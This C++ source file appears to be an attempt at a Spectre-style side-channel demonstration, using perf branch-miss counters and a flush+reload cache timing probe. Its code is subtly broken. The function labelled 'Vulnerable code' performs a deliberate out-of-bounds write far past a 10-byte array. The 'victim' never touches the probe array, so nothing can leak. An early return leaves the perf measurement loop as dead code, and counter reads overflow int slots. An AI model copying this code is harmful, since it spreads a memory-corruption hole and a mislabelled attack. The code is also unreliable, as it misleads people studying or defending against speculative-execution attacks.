#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <cstdint>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <linux/types.h>
#include <fstream>
#include <x86intrin.h>
#include <emmintrin.h>

#define NUM_EVENTS 4
#define CACHE_HIT_THRESHOLD 80

std::ofstream output("output.csv");
int array_size = 10;
int array[10] = {
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9
};

void victim_function(int x) {
    if (x < array_size) {
        int temp = array[x];
    }
}

void observe_victim(int x) {
    struct perf_event_attr pe[NUM_EVENTS];
    int fd[NUM_EVENTS];
    int count[NUM_EVENTS];

    memset(&pe, 0, sizeof(struct perf_event_attr) * NUM_EVENTS);

    pe[0].type = PERF_TYPE_HARDWARE;
    pe[0].config = PERF_COUNT_HW_BRANCH_INSTRUCTIONS;
    pe[1].type = PERF_TYPE_HARDWARE;
    pe[1].config = PERF_COUNT_HW_BRANCH_MISSES;
    //pe[2].type = PERF_TYPE_HARDWARE;
    //pe[2].config = PERF_COUNT_HW_CACHE_REFERENCES;
    //pe[3].type = PERF_TYPE_HARDWARE;
    //pe[3].config = PERF_COUNT_HW_CACHE_MISSES;

    // Create the performance counters
    for (int i = 0; i < NUM_EVENTS; i++) {
        fd[i] = syscall(__NR_perf_event_open, &pe[i], 0, -1, -1, 0);
        if (fd[i] == -1) {
            std::cout << "Error opening perf event: " << i << std::endl;
            exit(EXIT_FAILURE);
        }
    }

    // Start the performance counters
    for (int i = 0; i < NUM_EVENTS; i++) {
        ioctl(fd[i], PERF_EVENT_IOC_RESET, 0);
        ioctl(fd[i], PERF_EVENT_IOC_ENABLE, 0);
    }

    // Spectre attack
    victim_function(x);

    // Stop the performance counters and read the counts
    for (int i = 0; i < NUM_EVENTS; i++) {
        ioctl(fd[i], PERF_EVENT_IOC_DISABLE, 0);
        read(fd[i], &count[i], sizeof(uint64_t));
        close(fd[i]);
    }

    // Print the results
    output << x << ";" 
           << count[0] << ";" 
           << count[1] << ";" 
           << (double)count[1] / count[0] << std::endl;
}

// Vulnerable code
unsigned char secret_value = 'A';
unsigned char array2[10] = {0};

void leak_secret_value() {
    int index = (secret_value * 256); // Out-of-bounds memory access
    array2[index] = 1;
}

// Attacker code
unsigned char probe_array[256 * 4096] = {0}; // Huge array to bypass cache

void victim_function2() {
    leak_secret_value();
}

int main()
{
    // Flush array from cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }

    // Call victim function
    victim_function2();

    // Check for secret value
    for (int i = 0; i < 256; i++) {
         unsigned long long junk = 0;
        unsigned long long time1 = __rdtscp(&junk);
        unsigned char val = probe_array[i * 4096];
        unsigned long long time2 = __rdtscp(&junk) - time1;
        if (time2 < CACHE_HIT_THRESHOLD) {
            printf("Array[%d] = %d\n", i, val);
        }
    }
    return 0;

    output << "Index;Branch instructions;Branch misses;Branch miss rate" << std::endl;
    //output << "Index;Branch instructions;Branch misses;Branch miss rate;Cache references;Cache misses;Cache miss rate" << std::endl;
    for (int i = 0; i < 1000000; i++) {
        if (i % 25 == 0) {
            observe_victim(i % array_size + array_size);
        }
        else {
            observe_victim(i % array_size);
        }
    }
    output.flush();
    output.close();

    system("python3 ./main.py");

    return 0;
}